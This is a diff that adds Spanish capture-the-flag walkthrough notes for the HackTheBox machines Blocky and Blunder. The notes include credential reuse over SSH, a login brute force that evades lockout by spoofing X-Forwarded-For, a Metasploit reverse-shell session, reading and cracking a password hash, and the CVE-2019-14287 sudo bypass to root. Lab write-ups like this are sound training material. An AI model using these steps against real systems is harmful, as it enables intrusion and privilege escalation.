@@ -34,6 +34,62 @@ están en las [Chuletas](../../chuletas/index.md); aquí queda el flujo de cada 
   /bin/bash -p
   ```
 
+## Blocky (HTB)
+- Puertos: 21 FTP, 22 SSH, 80 HTTP. WordPress v4.8
+- `dirsearch` → `/wp-login.php`, `/plugins/` (listado de directorios activo),
+  `/wp-content/uploads`
+- En `/plugins/` hay un **`BlockyCore.jar`**. Descargarlo y descompilarlo (jd-gui, o
+  `unzip`/`javap`) → **credenciales de MySQL hardcodeadas** (`root : <password>`)
+- Usuario de WordPress en la BBDD: tabla `wp_users` → **`notch`** (hash PHPass, se puede
+  crackear, pero **no hace falta**)
+- **Reutilización de contraseña:** la password de la BBDD del `.jar` vale para SSH como `notch`:
+  ```bash
+  ssh notch@<ip>
+  ```
+- **Escalada:** `notch` pertenece al grupo `sudo` → shell de root directa:
+  ```bash
+  sudo -l    # (ALL : ALL) ALL
+  sudo -i
+  ```
+  (ver [sudo -i en la chuleta de Escalada](../../chuletas/escalada.md#vias-habituales-linux))
+
+## Blunder (HTB)
+- Código fuente / `dirsearch` → `/admin/home.php` → **CMS Bludit**
+- Buscar la versión; si no se ve en la web, `searchsploit bludit`. Todo apunta a **3.9.2**
+  → *authentication bruteforce bypass*
+- `/todo.txt` → *"new blog needs images"*, firmado por **fergus** (usuario)
+- `cewl http://<ip> -w dicc.txt` para generar un diccionario con palabras del propio blog
+- **Login + bloqueo:** fuerza bruta del formulario con Burp → Bludit bloquea por IP tras varios
+  intentos → se evita con un script en Python que manda `X-Forwarded-For` distinto en cada
+  petición (o iterando esa cabecera en Burp Intruder). Credencial: **`RolandDeschain`**
+- **Shell con Metasploit** (módulo autenticado de Bludit):
+  ```
+  msfconsole
+  search bludit
+  use 0
+  show options
+  set LHOST 10.10.14.157
+  set LPORT 4444
+  set BLUDITUSER fergus
+  set BLUDITPASS RolandDeschain
+  set RHOSTS 10.129.73.76
+  run
+  ```
+- `shell`; `whoami` → `www-data`. Estabilizar: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- **Hash de otro usuario** (hay dos instalaciones; el hash válido está en la `3.10.0a`):
+  ```
+  cd /var/www/bludit-3.10.0a/bl-content/databases
+  cat users.php        # contraseña hasheada de hugo → CrackStation
+  su hugo
+  ```
+- **Escalada por versión de sudo → CVE-2019-14287:**
+  ```
+  sudo -V              # sudo 1.8.25p1 (< 1.8.28 = vulnerable)
+  sudo -u#-1 /bin/bash # ejecuta como root: el UID -1 se interpreta como 0
+  ```
+  Funciona porque `sudo -l` permite a hugo ejecutar como *cualquier* usuario salvo root
+  (`(ALL, !root)`); el `-u#-1` burla ese `!root`. Ver [Escalada](../../chuletas/escalada.md).
+
 ## Facultad (THL)
 - `dirsearch` → `/education`; `/etc/hosts` → `facultad.thl`
 - `wpscan --url http://facultad.thl -e u` → `facultad`; Burp Intruder en `/wp-login.php`
